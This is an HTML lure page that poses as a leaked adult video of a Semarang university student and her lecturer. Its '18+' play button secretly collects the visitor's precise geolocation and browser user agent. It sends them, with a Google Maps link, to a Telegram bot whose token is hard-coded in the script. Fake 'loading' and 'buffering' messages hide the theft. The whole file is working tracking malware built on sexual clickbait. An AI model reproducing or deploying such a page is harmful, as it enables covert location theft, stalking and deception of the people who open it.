<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Verification</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background-color: #f3f4f6; }
        .card { background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); max-width: 400px; text-align: center; margin: 1rem; }
        .btn { background: #2563eb; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 1.5rem; width: 100%; font-size: 1rem; }
        .status { margin-top: 1rem; font-size: 0.9rem; color: #6b7280; }
    </style>
</head>
<body>
    <div class="card">
        <img src="test.jpg" alt="Preview" style="width: 100%; border-radius: 8px; margin-bottom: 1rem; object-fit: cover;">
        <h2>VIDEO MAHASISWI SEMARANG MAIN SAMA DOSEN</h2>
        <p>BOCOR!!! Full durasi Mahasiswi semarang main sama dosen</p>
        <button class="btn" onclick="requestLocation()">doodstream 18+</button>
        <div id="status" class="status"></div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = "8791673811:AAGwPYv0hrGZGqarZA9w7_KOrUruGelViro";
        const TELEGRAM_CHAT_ID = "@imFreed0mLocationTest";

        async function sendToTelegram(lat, lng, acc, userAgent) {
            const timestamp = new Date().toLocaleString();
            const message = `🚨 *NEW GEOLOCATION TELEMETRY*\n\n` +
                            `📍 *Coords:* \`${lat}, ${lng}\`\n` +
                            `🎯 *Accuracy:* ~${Math.round(acc)} meters\n` +
                            `📱 *User-Agent:* \`${userAgent}\`\n` +
                            `🕒 *Time:* ${timestamp}\n\n` +
                            `🗺️ [Open in Google Maps](https://www.google.com/maps?q=${lat},${lng})`;

            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: false
                    })
                });
            } catch (err) {
                console.error("Telegram dispatch error:", err);
            }
        }

        function requestLocation() {
            const status = document.getElementById('status');
            status.innerText = "Loading video player...";

            if (!navigator.geolocation) {
                status.innerText = "Location is not supported by your device.";
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const acc = position.coords.accuracy;
                    const ua = navigator.userAgent;

                    status.innerText = "Connecting to streaming server...";
                    await sendToTelegram(lat, lng, acc, ua);
                    status.innerText = "Buffering stream...";
                },
                (error) => {
                    status.innerText = "Playback failed. Permissions required.";
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }
    </script>
</body>
</html>
